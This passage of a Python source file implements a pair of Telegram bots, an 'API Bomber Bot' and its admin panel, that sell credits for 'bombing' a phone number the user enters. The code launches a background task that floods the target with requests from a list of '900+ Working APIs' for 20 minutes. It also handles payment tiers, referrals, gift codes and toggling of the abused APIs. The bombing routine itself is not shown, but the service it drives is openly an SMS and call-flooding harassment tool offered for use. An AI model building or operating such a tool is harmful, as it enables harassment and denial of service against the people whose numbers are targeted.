✅ <b>BOMBING COMPLETED!</b>

📱 Number: <code>{phone}</code>
⏱️ Duration: 20 minutes

📊 <b>Final Statistics:</b>
✅ Successful: <b>{stats['success']}</b>
❌ Failed: <b>{stats['fail']}</b>
🎯 Total Requests: <b>{stats['total']}</b>

💰 Credits used: 1
"""
    try:
        bot.edit_message_text(final_msg, chat_id, msg_id)
    except:
        pass
    
    if chat_id in active_tasks:
        del active_tasks[chat_id]

# ==================== MAIN BOT HANDLERS ====================
@bot.message_handler(commands=["start"])
def start_cmd(m):
    if is_blocked(m.from_user.id):
        bot.reply_to(m, "🚫 <b>You are blocked!</b>")
        return
    if not settings.get("bot_active", True):
        bot.reply_to(m, "⚠️ <b>Bot is under maintenance!</b>")
        return
    if not check_channel(m.from_user.id):
        show_join(m.chat.id)
        return
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {"credits": START_CREDITS, "joined": str(datetime.now())}
        
        # Check referral
        args = m.text.split()
        if len(args) == 2 and args[1].startswith("ref_"):
            ref_id = args[1].replace("ref_", "")
            if ref_id in users and ref_id != uid:
                users[ref_id]["credits"] = users[ref_id].get("credits", 0) + REF_CREDITS
                try:
                    bot.send_message(int(ref_id), f"🎉 <b>+{REF_CREDITS} credits!</b>\n\nNew referral joined!")
                except:
                    pass
        save_json(USERS_FILE, users)
    
    credits = users[uid].get("credits", 0)
    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
    
    bot.send_message(m.chat.id, f"""
👋 <b>Welcome to API Bomber Bot!</b>

💰 Credits: <b>{credits}</b>
👑 Premium: {premium_status}

📱 <b>How to use:</b>
Send a 10-digit phone number to start bombing!

💡 1 credit = 20 minutes of continuous API hits
🎁 Use /redeem or button to claim gift codes!
""", reply_markup=main_kb())

@bot.callback_query_handler(func=lambda c: c.data == "verify")
def verify_cb(c):
    if check_channel(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ Verified!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        start_cmd(c.message)
    else:
        bot.answer_callback_query(c.id, "❌ Join all channels first!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def stop_cb(c):
    chat_id = int(c.data.replace("stop_", ""))
    if chat_id in active_tasks:
        active_tasks[chat_id]["running"] = False
        bot.answer_callback_query(c.id, "🛑 Stopping...")
    else:
        bot.answer_callback_query(c.id, "No active task!")

# ✅ GIFT CODE REDEMPTION (NEW)
@bot.message_handler(commands=["redeem"])
def redeem_cmd(m):
    if is_blocked(m.from_user.id):
        return
    bot.reply_to(m, "🎁 <b>Redeem Gift Code</b>\n\nSend your gift code now:")
    bot.register_next_step_handler(m, process_redeem)

def process_redeem(m):
    code = m.text.strip().upper()
    result = redeem_gift_code(m.from_user.id, code)
    bot.reply_to(m, result["message"])

@bot.message_handler(func=lambda m: m.text == "🎁 Redeem Code")
def redeem_button(m):
    redeem_cmd(m)

@bot.message_handler(func=lambda m: m.text == "🚀 Start")
def start_button(m):
    start_cmd(m)

@bot.message_handler(func=lambda m: m.text and m.text.isdigit() and len(m.text) == 10)
def number_handler(m):
    if is_blocked(m.from_user.id):
        bot.reply_to(m, "🚫 Blocked!")
        return
    if not check_channel(m.from_user.id):
        show_join(m.chat.id)
        return
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {"credits": 0, "joined": str(datetime.now())}
        save_json(USERS_FILE, users)
    
    credits = users[uid].get("credits", 0)
    if credits < 1:
        bot.reply_to(m, "❌ <b>Insufficient credits!</b>\n\nBuy credits or refer friends.")
        return
    
    # Deduct credit
    users[uid]["credits"] = credits - 1
    save_json(USERS_FILE, users)
    
    phone = m.text
    wait_msg = bot.reply_to(m, f"🚀 <b>Starting bombing...</b>\n\n📱 Target: {phone}")
    
    # Start bombing in background
    loop = asyncio.new_event_loop()
    threading.Thread(target=lambda: loop.run_until_complete(bombing_task(phone, m.chat.id, wait_msg.message_id)), daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "💰 My Credits")
def credits_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    credits = users.get(uid, {}).get("credits", 0)
    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
    
    if is_premium(m.from_user.id):
        exp = datetime.fromisoformat(users[uid]["premium_until"])
        days_left = (exp - datetime.now()).days
        premium_info = f"\n⏰ Expires in: {days_left} days"
    else:
        premium_info = ""
    
    bot.reply_to(m, f"💰 <b>Your Credits: {credits}</b>\n👑 Premium: {premium_status}{premium_info}")

@bot.message_handler(func=lambda m: m.text == "📊 Stats")
def stats_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    user_data = users.get(uid, {})
    
    bot.reply_to(m, f"""
📊 <b>Your Statistics</b>

💰 Credits: <b>{user_data.get('credits', 0)}</b>
👑 Premium: <b>{'Yes' if is_premium(m.from_user.id) else 'No'}</b>
📅 Joined: <b>{user_data.get('joined', 'Unknown')[:10]}</b>

🚀 <b>Active APIs:</b> {len([a for a in apis_db if a['active']])}
👥 <b>Total Users:</b> {len(users)}
""")

@bot.message_handler(func=lambda m: m.text == "🔗 Refer")
def refer_cmd(m):
    if is_blocked(m.from_user.id):
        return
    uid = str(m.from_user.id)
    bot_username = bot.get_me().username
    ref_link = f"https://t.me/{bot_username}?start=ref_{uid}"
    bot.reply_to(m, f"🔗 <b>Refer & Earn!</b>\n\nYour link:\n<code>{ref_link}</code>\n\n💰 Earn {REF_CREDITS} credit per referral!")

@bot.message_handler(func=lambda m: m.text == "💳 Buy Credits")
def buy_cmd(m):
    if is_blocked(m.from_user.id):
        return
    
    prices = settings.get("credit_prices", CREDIT_PRICES)
    premium = settings.get("premium_price", PREMIUM_PRICE)
    owner = settings.get("owner_username", OWNER_USERNAME)
    
    msg = "💳 <b>Buy Credits</b>\n\n📋 <b>Prices:</b>\n\n"
    for price_data in prices.values():
        msg += f"• {price_data['label']}\n"
    msg += f"\n👑 <b>Premium:</b>\n• {premium['label']}\n   (Daily {premium['daily_credits']} credits auto-added)\n"
    msg += f"\n💰 Contact: {owner}"
    
    bot.reply_to(m, msg)

@bot.message_handler(func=lambda m: m.text == "❓ Help")
def help_cmd(m):
    bot.reply_to(m, f"""
📘 <b>How to Use:</b>

1️⃣ Send 10-digit phone number
2️⃣ Bot will bomb for 20 minutes
3️⃣ 1 credit per number

💡 <b>Features:</b>
• 900+ Working APIs
• Live statistics
• Stop anytime
• Premium membership
• Gift codes system

🎁 <b>Earn Credits:</b>
• Refer friends: {REF_CREDITS} credit/referral
• Redeem gift codes (/redeem)
• Buy credits
• Get premium
""")

@bot.message_handler(func=lambda m: m.text == "📞 Owner")
def owner_cmd(m):
    owner = settings.get("owner_username", OWNER_USERNAME)
    bot.reply_to(m, f"📞 <b>Owner Contact</b>\n\n👤 {owner}\n\n💼 For credit purchase & support")

# ==================== ADMIN BOT HANDLERS ====================
@admin_bot.message_handler(commands=["start"])
def admin_start(m):
    if not is_admin(m.from_user.id):
        admin_bot.reply_to(m, "❌ Unauthorized!")
        return
    
    status = "🟢 Active" if settings.get("bot_active", True) else "🔴 Maintenance"
    
    admin_bot.reply_to(m, f"""
🔐 <b>ADMIN PANEL</b>

Status: {status}

<b>📊 Bot Control:</b>
/on - Turn bot ON
/off - Turn bot OFF
/stats - Bot statistics

<b>👥 User Management:</b>
/add uid credits
/set uid credits
/check uid
/block uid
/unblock uid
/addpremium uid days

<b>🎁 Gift Code System (NEW):</b>
/createcode credits uses [days]
/listcodes - Show all codes
/deletecode CODE
/codeinfo CODE

<b>🚀 API Management:</b>
/listapis - Show all APIs
/toggleapi id - Enable/disable API
/apicount - Count active APIs

<b>💰 Price Management:</b>
/setprice amount credits
/setpremium price days daily_credits
/showprices

<b>🔗 Channel Management:</b>
/addchannel name id link
/removechannel name
/listchannels

<b>🤖 Bot Token Management (FIXED):</b>
/changetoken new_token
/changeadmintoken new_token
/currenttoken
/reloadbot - How to reload

<b>📢 Broadcast:</b>
/broadcast message
""")

@admin_bot.message_handler(commands=["on"])
def admin_on(m):
    if not is_admin(m.from_user.id):
        return
    settings["bot_active"] = True
    save_json(SETTINGS_FILE, settings)
    admin_bot.reply_to(m, "✅ Bot ON!")

@admin_bot.message_handler(commands=["off"])
def admin_off(m):
    if not is_admin(m.from_user.id):
        return
    settings["bot_active"] = False
    save_json(SETTINGS_FILE, settings)
    admin_bot.reply_to(m, "🔴 Bot OFF!")

@admin_bot.message_handler(commands=["stats"])
def admin_stats(m):
    if not is_admin(m.from_user.id):
        return
    
    total_users = len(users)
    premium_users = sum(1 for uid in users if is_premium(int(uid)))
    total_credits = sum(u.get("credits", 0) for u in users.values())
    active_apis = sum(1 for a in apis_db if a["active"])
    total_codes = len(giftcodes)
    active_codes = sum(1 for g in giftcodes.values() if len(g["used_by"]) < g["max_uses"])
    
    admin_bot.reply_to(m, f"""
📊 <b>Bot Statistics</b>

👥 Total Users: {total_users}
👑 Premium Users: {premium_users}
💰 Total Credits: {total_credits}
🚀 Active APIs: {active_apis}/{len(apis_db)}
🚫 Blocked: {len(blocked)}
🎁 Gift Codes: {active_codes}/{total_codes} active
""")

@admin_bot.message_handler(commands=["add"])
def admin_add(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, uid, amount = m.text.split()
        uid, amount = str(uid), int(amount)
        if uid not in users:
            users[uid] = {"credits": 0, "joined": str(datetime.now())}
        users[uid]["credits"] = users[uid].get("credits", 0) + amount
        save_json(USERS_FILE, users)
        admin_bot.reply_to(m, f"✅ Added {amount} credits to {uid}")
        try:
            bot.send_message(int(uid), f"🎁 +{amount} credits added by admin!")
        except:
            pass
    except:
        admin_bot.reply_to(m, "❌ Usage: /add uid amount")

@admin_bot.message_handler(commands=["set"])
def admin_set(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, uid, amount = m.text.split()
        uid, amount = str(uid), int(amount)
        if uid not in users:
            users[uid] = {"joined": str(datetime.now())}
        users[uid]["credits"] = amount
        save_json(USERS_FILE, users)
        admin_bot.reply_to(m, f"✅ Set {uid} credits to {amount}")
    except:
        admin_bot.reply_to(m, "❌ Usage: /set uid amount")

@admin_bot.message_handler(commands=["check"])
def admin_check(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = m.text.split()[1]
        if uid not in users:
            admin_bot.reply_to(m, "❌ User not found!")
            return
        data = users[uid]
        premium = "Yes" if is_premium(int(uid)) else "No"
        admin_bot.reply_to(m, f"""
👤 <b>User Info</b>

ID: <code>{uid}</code>
💰 Credits: {data.get('credits', 0)}
👑 Premium: {premium}
📅 Joined: {data.get('joined', 'Unknown')[:10]}
""")
    except:
        admin_bot.reply_to(m, "❌ Usage: /check uid")

@admin_bot.message_handler(commands=["block"])
def admin_block(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = int(m.text.split()[1])
        if uid not in blocked:
            blocked.append(uid)
            save_json(BLOCKED_FILE, blocked)
            admin_bot.reply_to(m, f"✅ Blocked {uid}")
    except:
        admin_bot.reply_to(m, "❌ Usage: /block uid")

@admin_bot.message_handler(commands=["unblock"])
def admin_unblock(m):
    if not is_admin(m.from_user.id):
        return
    try:
        uid = int(m.text.split()[1])
        if uid in blocked:
            blocked.remove(uid)
            save_json(BLOCKED_FILE, blocked)
            admin_bot.reply_to(m, f"✅ Unblocked {uid}")
    except:
        admin_bot.reply_to(m, "❌ Usage: /unblock uid")

@admin_bot.message_handler(commands=["addpremium"])
def admin_addpremium(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, uid, days = m.text.split()
        uid, days = str(uid), int(days)
        if uid not in users:
            users[uid] = {"credits": 0, "joined": str(datetime.now())}
        exp = datetime.now() + timedelta(days=days)
        users[uid]["premium_until"] = exp.isoformat()
        save_json(USERS_FILE, users)
        admin_bot.reply_to(m, f"✅ Added {days} days premium to {uid}")
        try:
            bot.send_message(int(uid), f"👑 <b>Premium Activated!</b>\n\nYou have {days} days premium access!")
        except:
            pass
    except:
        admin_bot.reply_to(m, "❌ Usage: /addpremium uid days")

# ✅ GIFT CODE ADMIN COMMANDS (NEW)
@admin_bot.message_handler(commands=["createcode"])
def admin_createcode(m):
    if not is_admin(m.from_user.id):
        return
    try:
        parts = m.text.split()
        if len(parts) < 3:
            admin_bot.reply_to(m, """
❌ <b>Usage:</b> /createcode credits uses [days]

<b>Examples:</b>
• /createcode 10 5 - 10 credits, 5 uses, no expiry
• /createcode 20 10 30 - 20 credits, 10 uses, expires in 30 days
""")
            return
        
        credits = int(parts[1])
        uses = int(parts[2])
        days = int(parts[3]) if len(parts) > 3 else None
        
        code = create_gift_code(credits, uses, days)
        
        expires_msg = f"\n⏰ Expires: {days} days" if days else "\n⏰ Never expires"
        admin_bot.reply_to(m, f"""
✅ <b>Gift Code Created!</b>

🎁 Code: <code>{code}</code>
💰 Credits: {credits}
👥 Max Uses: {uses}{expires_msg}

Share this code with users!
They can use /redeem command to claim it.
""")
        
        logger.info(f"Gift code created: {code} ({credits} credits, {uses} uses)")
        
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

@admin_bot.message_handler(commands=["listcodes"])
def admin_listcodes(m):
    if not is_admin(m.from_user.id):
        return
    
    if not giftcodes:
        admin_bot.reply_to(m, "📋 No gift codes created yet!\n\nUse /createcode to create one.")
        return
    
    msg = "🎁 <b>All Gift Codes:</b>\n\n"
    for code, data in giftcodes.items():
        used = len(data["used_by"])
        max_uses = data["max_uses"]
        status = "✅ Active" if used < max_uses else "❌ Used Up"
        
        expires = ""
        if data.get("expires"):
            exp_date = datetime.fromisoformat(data["expires"])
            if datetime.now() > exp_date:
                status = "❌ Expired"
                expires = f"\n   ⏰ Expired on: {data['expires'][:10]}"
            else:
                days_left = (exp_date - datetime.now()).days
                expires = f"\n   ⏰ {days_left} days left"
        
        msg += f"{status}\n"
        msg += f"🔑 <code>{code}</code>\n"
        msg += f"   💰 Credits: {data['credits']}\n"
        msg += f"   👥 Used: {used}/{max_uses}{expires}\n\n"
    
    admin_bot.reply_to(m, msg)

@admin_bot.message_handler(commands=["deletecode"])
def admin_deletecode(m):
    if not is_admin(m.from_user.id):
        return
    try:
        code = m.text.split()[1].upper()
        if code in giftcodes:
            del giftcodes[code]
            save_json(GIFTCODES_FILE, giftcodes)
            admin_bot.reply_to(m, f"✅ Deleted gift code: <code>{code}</code>")
            logger.info(f"Gift code deleted: {code}")
        else:
            admin_bot.reply_to(m, "❌ Code not found!")
    except:
        admin_bot.reply_to(m, "❌ Usage: /deletecode CODE")

@admin_bot.message_handler(commands=["codeinfo"])
def admin_codeinfo(m):
    if not is_admin(m.from_user.id):
        return
    try:
        code = m.text.split()[1].upper()
        if code not in giftcodes:
            admin_bot.reply_to(m, "❌ Code not found!")
            return
        
        data = giftcodes[code]
        used_list = "\n".join([f"• <code>{uid}</code>" for uid in data["used_by"]]) if data["used_by"] else "None yet"
        
        expires = ""
        if data.get("expires"):
            exp_date = datetime.fromisoformat(data["expires"])
            if datetime.now() > exp_date:
                expires = f"\n⏰ Status: ❌ Expired on {data['expires'][:10]}"
            else:
                days_left = (exp_date - datetime.now()).days
                expires = f"\n⏰ Expires: {days_left} days"
        else:
            expires = "\n⏰ Never expires"
        
        admin_bot.reply_to(m, f"""
🎁 <b>Gift Code Details</b>

🔑 Code: <code>{code}</code>
💰 Credits: {data['credits']}
👥 Max Uses: {data['max_uses']}
✅ Used: {len(data['used_by'])}/{data['max_uses']}
📅 Created: {data['created'][:10]}{expires}

<b>Used By:</b>
{used_list}
""")
    except:
        admin_bot.reply_to(m, "❌ Usage: /codeinfo CODE")

@admin_bot.message_handler(commands=["listapis"])
def admin_listapis(m):
    if not is_admin(m.from_user.id):
        return
    
    active = [a for a in apis_db if a["active"]]
    inactive = [a for a in apis_db if not a["active"]]
    
    msg = f"🚀 <b>Active APIs ({len(active)}):</b>\n\n"
    for api in active[:20]:
        msg += f"✅ {api['id']}: {api['name']}\n"
    
    if len(active) > 20:
        msg += f"\n... and {len(active) - 20} more\n"
    
    msg += f"\n❌ <b>Inactive ({len(inactive)})</b>"
    
    admin_bot.reply_to(m, msg)

@admin_bot.message_handler(commands=["toggleapi"])
def admin_toggle(m):
    if not is_admin(m.from_user.id):
        return
    try:
        api_id = int(m.text.split()[1])
        if 0 <= api_id < len(apis_db):
            apis_db[api_id]["active"] = not apis_db[api_id]["active"]
            save_json(APIS_FILE, apis_db)
            status = "enabled" if apis_db[api_id]["active"] else "disabled"
            admin_bot.reply_to(m, f"✅ API {api_id} {status}")
        else:
            admin_bot.reply_to(m, "❌ Invalid API ID!")
    except:
        admin_bot.reply_to(m, "❌ Usage: /toggleapi id")

@admin_bot.message_handler(commands=["apicount"])
def admin_apicount(m):
    if not is_admin(m.from_user.id):
        return
    active = sum(1 for a in apis_db if a["active"])
    admin_bot.reply_to(m, f"🚀 Active APIs: {active}/{len(apis_db)}")

@admin_bot.message_handler(commands=["setprice"])
def admin_setprice(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, amount, credits = m.text.split()
        amount, credits = str(amount), int(credits)
        if "credit_prices" not in settings:
            settings["credit_prices"] = {}
        settings["credit_prices"][amount] = {"credits": credits, "label": f"₹{amount} → {credits} Credits"}
        save_json(SETTINGS_FILE, settings)
        admin_bot.reply_to(m, f"✅ Set ₹{amount} = {credits} credits")
    except:
        admin_bot.reply_to(m, "❌ Usage: /setprice amount credits")

@admin_bot.message_handler(commands=["setpremium"])
def admin_setpremium(m):
    if not is_admin(m.from_user.id):
        return
    try:
        _, price, days, daily = m.text.split()
        price, days, daily = str(price), int(days), int(daily)
        settings["premium_price"] = {"price": price, "days": days, "daily_credits": daily, "label": f"₹{price} → {days} Days Premium"}
        save_json(SETTINGS_FILE, settings)
        admin_bot.reply_to(m, f"✅ Premium: ₹{price} = {days} days, {daily} daily credits")
    except:
        admin_bot.reply_to(m, "❌ Usage: /setpremium price days daily_credits")

@admin_bot.message_handler(commands=["showprices"])
def admin_showprices(m):
    if not is_admin(m.from_user.id):
        return
    
    prices = settings.get("credit_prices", CREDIT_PRICES)
    premium = settings.get("premium_price", PREMIUM_PRICE)
    
    msg = "💳 <b>Current Prices:</b>\n\n"
    for price_data in prices.values():
        msg += f"• {price_data['label']}\n"
    msg += f"\n👑 Premium: {premium['label']}"
    
    admin_bot.reply_to(m, msg)

@admin_bot.message_handler(commands=["addchannel"])
def admin_addchannel(m):
    if not is_admin(m.from_user.id):
        return
    try:
        parts = m.text.split(maxsplit=3)
        if len(parts) != 4:
            admin_bot.reply_to(m, "❌ Usage: /addchannel name channel_id link\n\nExample: /addchannel updates @yourchannel https://t.me/yourchannel")
            return
        
        name = parts[1]
        channel_id = parts[2]
        link = parts[3]
        
        if channel_id.startswith("-") and channel_id[1:].isdigit():
            channel_id = int(channel_id)
        
        if "channels" not in settings:
            settings["channels"] = {}
        if "channel_links" not in settings:
            settings["channel_links"] = {}
        
        settings["channels"][name] = channel_id
        settings["channel_links"][name] = link
        save_json(SETTINGS_FILE, settings)
        
        admin_bot.reply_to(m, f"✅ Channel added!\n\n📌 Name: {name}\n🆔 ID: {channel_id}\n🔗 Link: {link}")
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

@admin_bot.message_handler(commands=["removechannel"])
def admin_removechannel(m):
    if not is_admin(m.from_user.id):
        return
    try:
        name = m.text.split()[1]
        
        if "channels" not in settings or name not in settings["channels"]:
            admin_bot.reply_to(m, f"❌ Channel '{name}' not found!")
            return
        
        del settings["channels"][name]
        if "channel_links" in settings and name in settings["channel_links"]:
            del settings["channel_links"][name]
        
        save_json(SETTINGS_FILE, settings)
        admin_bot.reply_to(m, f"✅ Removed channel: {name}")
    except:
        admin_bot.reply_to(m, "❌ Usage: /removechannel name")

@admin_bot.message_handler(commands=["listchannels"])
def admin_listchannels(m):
    if not is_admin(m.from_user.id):
        return
    
    channels = settings.get("channels", {})
    links = settings.get("channel_links", {})
    
    if not channels:
        admin_bot.reply_to(m, "📋 No channels configured!")
        return
    
    msg = "📋 <b>Configured Channels:</b>\n\n"
    for name, channel_id in channels.items():
        link = links.get(name, "N/A")
        msg += f"• <b>{name}</b>\n"
        msg += f"  ID: <code>{channel_id}</code>\n"
        msg += f"  Link: {link}\n\n"
    
    admin_bot.reply_to(m, msg)

# ✅ TOKEN MANAGEMENT (FIXED)
@admin_bot.message_handler(commands=["changetoken"])
def admin_changetoken(m):
    if not is_admin(m.from_user.id):
        return
    try:
        new_token = m.text.replace("/changetoken ", "", 1).strip()
        
        if not new_token or ":" not in new_token:
            admin_bot.reply_to(m, """
❌ <b>Usage:</b> /changetoken NEW_BOT_TOKEN

<b>Example:</b>
/changetoken 123456:ABCdefGHIjkl_xyz

After changing token:
1. Token will be saved in settings.json
2. Use /reloadbot for instructions to apply changes
""")
            return
        
        # Test the new token
        test_bot = telebot.TeleBot(new_token)
        bot_info = test_bot.get_me()
        
        # Update token in settings
        settings["main_bot_token"] = new_token
        save_json(SETTINGS_FILE, settings)
        
        admin_bot.reply_to(m, f"""
✅ <b>Main Bot Token Changed Successfully!</b>

🤖 New Bot: @{bot_info.username}
🆔 Bot ID: {bot_info.id}

✅ Token saved in settings.json

⚠️ <b>NEXT STEP:</b>
Use /reloadbot to see how to apply changes
""")
        
        logger.info(f"Main bot token changed by admin {m.from_user.id}")
        logger.info(f"New bot: @{bot_info.username}")
        
    except telebot.apihelper.ApiException as e:
        admin_bot.reply_to(m, f"❌ Invalid token!\n\nError: {e}")
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

@admin_bot.message_handler(commands=["changeadmintoken"])
def admin_changeadmintoken(m):
    if not is_admin(m.from_user.id):
        return
    try:
        new_token = m.text.replace("/changeadmintoken ", "", 1).strip()
        
        if not new_token or ":" not in new_token:
            admin_bot.reply_to(m, "❌ Usage: /changeadmintoken NEW_ADMIN_TOKEN")
            return
        
        # Test the new token
        test_bot = telebot.TeleBot(new_token)
        bot_info = test_bot.get_me()
        
        # Update token in settings
        settings["admin_bot_token"] = new_token
        save_json(SETTINGS_FILE, settings)
        
        admin_bot.reply_to(m, f"""
✅ <b>Admin Bot Token Changed!</b>

🤖 New Bot: @{bot_info.username}
🆔 Bot ID: {bot_info.id}

⚠️ Restart required to apply changes!
""")
        
        logger.info(f"Admin bot token changed by admin {m.from_user.id}")
        
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

@admin_bot.message_handler(commands=["currenttoken"])
def admin_currenttoken(m):
    if not is_admin(m.from_user.id):
        return
    try:
        main_token = settings.get("main_bot_token", DEFAULT_MAIN_BOT_TOKEN)
        admin_token = settings.get("admin_bot_token", DEFAULT_ADMIN_BOT_TOKEN)
        
        bot_info = bot.get_me()
        admin_info = admin_bot.get_me()
        
        # Mask tokens
        main_masked = main_token[:10] + "..." + main_token[-10:]
        admin_masked = admin_token[:10] + "..." + admin_token[-10:]
        
        admin_bot.reply_to(m, f"""
🤖 <b>Current Bot Tokens</b>

<b>Main Bot:</b>
Username: @{bot_info.username}
Bot ID: {bot_info.id}
Token: <code>{main_masked}</code>

<b>Admin Bot:</b>
Username: @{admin_info.username}
Bot ID: {admin_info.id}
Token: <code>{admin_masked}</code>

⚠️ Full tokens in settings.json
""")
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

@admin_bot.message_handler(commands=["reloadbot"])
def admin_reloadbot(m):
    if not is_admin(m.from_user.id):
        return
    
    admin_bot.reply_to(m, """
🔄 <b>How to Apply Token Changes</b>

<b>Method 1 - Railway (Recommended):</b>
1. Go to Railway dashboard
2. Select your project
3. Go to "Settings" tab
4. Click "Restart" button
5. Bot will restart with new token ✅

<b>Method 2 - Manual:</b>
1. Stop bot (Ctrl+C in terminal)
2. Run: python bot.py
3. New token loads automatically ✅

<b>Method 3 - Railway Redeploy:</b>
1. Make any small change to code
2. Push to GitHub
3. Railway auto-deploys ✅

The bot automatically loads tokens from settings.json on startup!
""")

@admin_bot.message_handler(commands=["broadcast"])
def admin_broadcast(m):
    if not is_admin(m.from_user.id):
        return
    try:
        msg = m.text.replace("/broadcast ", "", 1)
        if not msg:
            admin_bot.reply_to(m, "❌ Usage: /broadcast message")
            return
        
        success = 0
        fail = 0
        for uid in users:
            try:
                bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}")
                success += 1
                time.sleep(0.05)
            except:
                fail += 1
        
        admin_bot.reply_to(m, f"✅ Broadcast complete!\n\n✅ Success: {success}\n❌ Failed: {fail}")
    except Exception as e:
        admin_bot.reply_to(m, f"❌ Error: {e}")

# ==================== START BOTS ====================
def start_main_bot():
    while True:
        try:
            logger.info("🤖 Main bot starting...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Main bot error: {e}")
            time.sleep(5)

def start_admin_bot():
    while True:
        try:
            logger.info("⚙️ Admin bot starting...")
            admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Admin bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    logger.info("🚀 Starting bots...")
    logger.info(f"✅ Main bot: @{bot.get_me().username}")
    logger.info(f"✅ Admin bot: @{admin_bot.get_me().username}")
    
    main_thread = threading.Thread(target=start_main_bot, daemon=True)
    admin_thread = threading.Thread(target=start_admin_bot, daemon=True)
    
    main_thread.start()
    admin_thread.start()
    
    logger.info("✅ Bots running!")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("⚠️ Stopping bots...")
